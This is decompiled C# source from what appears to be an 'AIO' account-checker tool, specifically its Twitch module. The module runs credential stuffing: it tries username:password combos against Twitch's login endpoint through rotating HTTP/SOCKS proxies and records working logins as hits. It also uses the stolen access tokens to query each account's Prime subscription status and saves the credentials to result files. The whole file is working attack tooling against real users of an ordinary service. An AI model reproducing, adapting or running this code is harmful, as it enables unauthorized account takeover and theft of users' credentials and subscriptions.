// Decompiled with JetBrains decompiler
// Type: Twitch.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Twitch
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = true;
            httpRequest.Referer = "https://www.twitch.tv/";
            httpRequest.AddHeader("Content-Type", "text/plain;charset=UTF-8");
            string str = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"client_id\":\"jf3xu125ejjjt5cl4osdjci6oz6p93r\",\"undelete_user\":false}";
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            string input = httpRequest.Post("https://passport.twitch.tv/login", str, "application/x-www-form-urlencoded").ToString();
            if (input.Contains("\"access_token\""))
            {
              string captures = Check.TwitchGetCaptures(Regex.Match(input, "{\"access_token\":\"(.*?)\"").Groups[1].Value);
              ++mainmenu.hits;
              if (mainmenu.p1 == "2")
                Colorful.Console.WriteLine("[HIT - TWITCH] " + s[0] + ":" + s[1] + " | " + captures, Color.Green);
              Export.AsResult("/Twitch_hits", s[0] + ":" + s[1] + " | " + captures);
              return false;
            }
            if (input.Contains("missing authy token\",\"sms_proof\"") || input.Contains("user needs password reset") || input.Contains("missing twitchguard code") || input.Contains("Please enter a Login Verification Code"))
            {
              ++mainmenu.frees;
              if (mainmenu.p1 == "2")
                Colorful.Console.WriteLine("[FREE - TWITCH] " + s[0] + ":" + s[1], Color.OrangeRed);
              Export.AsResult("/Twitch_frees", s[0] + ":" + s[1]);
              return false;
            }
            break;
          }
        }
        catch (Exception ex)
        {
          ++mainmenu.errors;
        }
      }
      return false;
    }

    private static string TwitchGetCaptures(string accessToken)
    {
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            string proxyAddress = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxyAddress);
            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = true;
            httpRequest.Authorization = "OAuth " + accessToken;
            httpRequest.AddHeader("Client-Id", "jf3xu125ejjjt5cl4osdjci6oz6p93r");
            httpRequest.Referer = "https://www.twitch.tv/subscriptions";
            return Regex.Match(httpRequest.Post(new Uri("https://gql.twitch.tv/gql"), "[{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"GIFT\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"MOBILE_ALL\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"ALL\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_ExpiredSubscriptions\",\"variables\":{\"limit\":100,\"cursor\":\"\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fa5bcd68980e687a0b4ff2ef63792089df1500546d5f1bb2b6e9ee4a6282222b\"}}}]", "text/plain;charset=UTF-8").ToString(), "hasPrime\":(.*?),").Groups[1].Value.Contains("true") ? "Has Twitch Prime" : "Free";
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
